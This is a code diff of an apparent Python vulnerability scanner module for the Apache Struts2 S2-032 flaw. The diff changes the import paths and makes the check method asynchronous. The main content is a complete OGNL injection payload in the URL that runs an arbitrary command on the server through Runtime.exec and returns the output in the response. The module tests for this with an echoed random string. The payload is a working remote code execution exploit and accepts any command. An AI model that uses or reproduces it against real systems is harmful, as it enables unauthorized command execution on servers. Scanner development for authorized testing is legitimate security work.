@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 
-from app.lib.utils.request import request
-from app.lib.utils.common import get_capta, get_useragent
+from app.lib.request import request
+from app.lib.common import get_capta, get_useragent
 
 class S2_032_BaseVerify:
     def __init__(self, url):
@@ -22,7 +22,7 @@ class S2_032_BaseVerify:
         }
         self.payload = '''?method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding%5B0%5D),%23w%3d%23res.getWriter(),%23s%3dnew+java.util.Scanner(@java.lang.Runtime@getRuntime().exec(%23parameters.cmd%5B0%5D).getInputStream()).useDelimiter(%23parameters.pp%5B0%5D),%23str%3d%23s.hasNext()%3f%23s.next()%3a%23parameters.ppp%5B0%5D,%23w.print(%23str),%23w.close(),1?%23xx:%23request.toString&pp=%5C%5CA&ppp=%20&encoding=UTF-8&cmd={cmd}'''
     
-    def check(self):
+    async def check(self):
 
         """
         检测是否存在漏洞
@@ -33,15 +33,12 @@ class S2_032_BaseVerify:
         """
 
         try:
-            check_req = request.get(self.url + self.payload.format(cmd = 'echo ' + self.capta), headers = self.headers)
-            if self.capta in check_req.text and len(check_req.text) < 100:
+            check_req = await request.get(self.url + self.payload.format(cmd = 'echo ' + self.capta), headers = self.headers)
+            if self.capta in await check_req.text() and len(await check_req.text()) < 100:
                 return True
-            else:
-                return False
+            
         except Exception as e:
-            print(e)
-            return False
-        finally:
+            # print(e)
             pass
 
 if  __name__ == "__main__":
